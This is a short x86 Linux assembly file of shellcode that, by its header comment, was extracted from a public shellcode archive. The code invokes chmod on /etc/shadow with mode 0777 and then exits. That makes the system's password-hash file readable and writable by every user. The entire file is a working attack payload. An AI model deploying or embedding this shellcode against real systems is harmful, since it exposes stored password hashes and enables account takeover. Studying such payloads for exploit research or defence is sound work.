; Content:	extracted assembly code (chmod 0777 /etc/shadow) from http://shell-storm.org/shellcode/files/shellcode-590.php
; Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
; Date: 	10/2017
;


global _start

_start:
	xor eax,eax
	push eax
	mov al, 0xf
	push 0x776f6461
	push 0x68732f63
	push 0x74652f2f
	mov ebx, esp
	xor ecx, ecx
	mov cx, 0x1ff
	int 0x80
	inc eax
	int 0x80

